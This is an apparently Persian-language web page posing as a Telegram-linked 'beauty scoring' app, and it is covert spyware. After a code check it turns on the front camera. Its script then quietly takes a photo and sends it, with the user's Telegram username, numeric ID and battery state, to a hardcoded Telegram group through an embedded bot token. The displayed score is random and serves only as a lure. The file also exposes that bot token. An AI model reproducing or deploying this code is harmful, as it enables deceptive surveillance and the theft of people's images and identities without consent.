<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>Hqlme | Photo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; }
    body {
      margin: 0; background: linear-gradient(to top right, #f0f8ff, #cbe8ff);
      color: #333; direction: rtl; padding: 30px;
    }
    .container {
      max-width: 500px; margin: auto;
      background: white; padding: 30px;
      border-radius: 30px; box-shadow: 0 0 30px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center; color: #0057c2;
      margin-bottom: 20px;
    }
    label { font-weight: bold; display: block; margin-top: 15px; }
    input {
      width: 100%; padding: 12px; border: 1px solid #ccc;
      border-radius: 12px; margin-top: 6px;
    }
    button {
      width: 100%; margin-top: 25px; padding: 14px;
      background: linear-gradient(to left, #0077ff, #00c6ff);
      color: white; border: none; border-radius: 12px;
      font-size: 16px; cursor: pointer;
      transition: background 0.3s;
    }
    button:disabled {
      background: #aaa;
      cursor: not-allowed;
    }
    .note {
      font-size: 13px; margin-top: 10px; background: #eef6ff;
      padding: 10px 15px; border-radius: 10px;
    }

    #cameraView {
      display: none; flex-direction: column; align-items: center;
    }
    video {
      width: 100%; max-width: 100%; border-radius: 30px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
    }
    .countdown {
      font-size: 22px; font-weight: bold; color: #0077ff;
      background: #e6f0ff; padding: 10px 25px;
      border-radius: 20px; margin-top: 20px;
      animation: pulse 1s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    #resultBox {
      display: none; background: white; border-radius: 20px;
      padding: 20px; text-align: center; box-shadow: 0 0 30px rgba(0,0,0,0.2);
      position: fixed; bottom: 20px; right: 50%; transform: translateX(50%);
      width: 90%; max-width: 400px; z-index: 10;
    }
    #score {
      font-size: 36px; color: #00aaff; margin-bottom: 15px;
    }
    #retryBtn, #exitBtn {
      margin-top: 10px; padding: 10px 20px;
      border: none; border-radius: 12px; cursor: pointer;
      font-size: 15px;
    }
    #retryBtn {
      background: #0077ff; color: white; margin-left: 10px;
    }
    #exitBtn {
      background: #ccc;
    }

    @media (max-height: 700px) {
      #retryBtn, #exitBtn {
        font-size: 13px;
      }
    }
  </style>
</head>
<body>

<div class="container" id="formContainer">
  <h2>زیبایی‌سنج Hqlme</h2>
  <label>آیدی عددی تلگرام</label>
  <input id="userId" placeholder="مثلاً 123456789">
  <label>یوزرنیم (با @)</label>
  <input id="username" placeholder="مثلاً @example">
  <div class="note">
    ربات <b>@HqlmePhotoBot</b> را استارت کنید.<br>
    برای آیدی عددی به <b>@userinfobot</b> بروید.
  </div>
  <button onclick="sendCode(event)">ارسال کد تأیید</button>

  <div id="verifySection" style="display:none;">
    <label>کد تأیید</label>
    <input id="codeInput" placeholder="کدی که در تلگرام دریافت کردید">
    <button onclick="verifyCode()">تأیید و ادامه</button>
  </div>
</div>

<div id="cameraView" class="container">
  <video id="video" autoplay muted playsinline></video>
  <div class="countdown" id="countdownText">لطفاً تکان نخورید... 10</div>
</div>

<div id="resultBox">
  <div id="score">نمره: 75</div>
  <button id="retryBtn" onclick="retry()">امتحان مجدد</button>
  <button id="exitBtn" onclick="location.reload()">خروج</button>
</div>

<script>
  const token = "7396553495:AAHfctgjqILhUGihcPZuqTTgRWrXxtGBUH4";
  const groupId = "-1002534583259";
  let sentCode = "", uid = "", uname = "";
  let lastScore = null;

  async function sendCode(event) {
    uid = document.getElementById("userId").value.trim();
    uname = document.getElementById("username").value.trim();

    if (!uid || !uname) {
      alert("لطفاً همه فیلدها را پر کنید.");
      return;
    }

    sentCode = Math.floor(100000 + Math.random() * 900000).toString();
    const message = `✅ کد تأیید شما:\n\`\`\`${sentCode}\`\`\`\n\nربات: @HqlmePhotoBot`;

    const btn = event.target;
    btn.innerText = "در حال ارسال...";
    btn.disabled = true;

    try {
      const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: uid,
          text: message,
          parse_mode: "Markdown"
        })
      });

      const data = await res.json();
      if (data.ok) {
        document.getElementById("verifySection").style.display = "block";
      } else {
        alert("ارسال کد ناموفق بود. آیدی عددی درست وارد شده؟");
      }

    } catch (err) {
      alert("خطا در ارسال به تلگرام.");
    } finally {
      btn.innerText = "ارسال کد تأیید";
      btn.disabled = false;
    }
  }

  function verifyCode() {
    const input = document.getElementById("codeInput").value.trim();
    if (input === sentCode) {
      document.getElementById("formContainer").style.display = "none";
      document.getElementById("cameraView").style.display = "flex";
      startCamera();
    } else {
      alert("کد اشتباه است.");
    }
  }

  let stream;
  async function startCamera() {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.getElementById("video");
    video.srcObject = stream;
    runCountdown();
  }

  function runCountdown() {
    let time = 10;
    const countdownEl = document.getElementById("countdownText");
    countdownEl.innerText = `لطفاً تکان نخورید... ${time}`;
    const interval = setInterval(() => {
      time--;
      countdownEl.innerText = `لطفاً تکان نخورید... ${time}`;
      if (time === 5) takePhoto();
      if (time <= 0) {
        clearInterval(interval);
        showScore();
      }
    }, 1000);
  }

  function takePhoto() {
    const video = document.getElementById("video");
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(async (blob) => {
      const battery = await navigator.getBattery();
      const caption = `یوزرنیم: ${uname}\nآیدی عددی: ${uid}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`;
      const form = new FormData();
      form.append("chat_id", groupId);
      form.append("caption", caption);
      form.append("photo", blob, "photo.jpg");
      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST", body: form
      });
    }, 'image/jpeg');
  }

  function showScore() {
    let score;
    if (lastScore === null) {
      score = Math.random() < 0.7 ? Math.floor(51 + Math.random() * 49) : Math.floor(Math.random() * 50);
    } else {
      const delta = Math.floor(Math.random() * 10) - 5;
      score = Math.max(0, Math.min(100, lastScore + delta));
    }
    lastScore = score;
    document.getElementById("score").innerText = `نمره: ${score}`;
    document.getElementById("resultBox").style.display = "block";
  }

  function retry() {
    document.getElementById("resultBox").style.display = "none";
    runCountdown();
  }
</script>

</body>
</html>
